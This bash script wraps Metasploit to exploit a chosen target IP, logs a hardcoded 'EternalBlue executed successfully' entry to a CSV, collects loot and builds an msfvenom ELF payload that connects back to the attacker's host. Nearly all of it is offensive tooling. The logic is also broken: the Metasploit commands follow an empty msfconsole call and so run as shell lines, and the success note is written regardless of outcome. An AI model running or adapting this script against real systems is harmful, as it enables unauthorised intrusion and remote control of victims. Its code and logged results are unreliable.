#!/bin/bash

echo "Starting PostGreSQL and Metasploit"
sudo systemctl start postgresql

# Information before starting
echo "Choose the exploit"
read EXPLOIT

echo "Choose the payload"
read PAYLOAD

echo "Enter your LHOST"
read LHOST

echo "Enter your LPORT"
read LPORT

echo "Enter the target IP"
read RHOST

# Metasploit console
echo "Starting Metasploit Console"
msfconsole -q -x ''

use $EXPLOIT
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set RHOST $RHOST
exploit -z
exit

# Saving notes to CSV files
echo "Saving notes to notes.csv"
echo "$(date +%d-%m-%Y\ %H:%M:%S),$RHOST,SMB,445,TCP,Exploitation,MS17-010 EternalBlue exploit - executed successfully" >> notes.csv

# Document loot in CSV
echo "Documenting loot"
loot -t csv

# Create the payload
echo "Creation payload"
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f elf > payload.elf
echo "Payload created successfully"
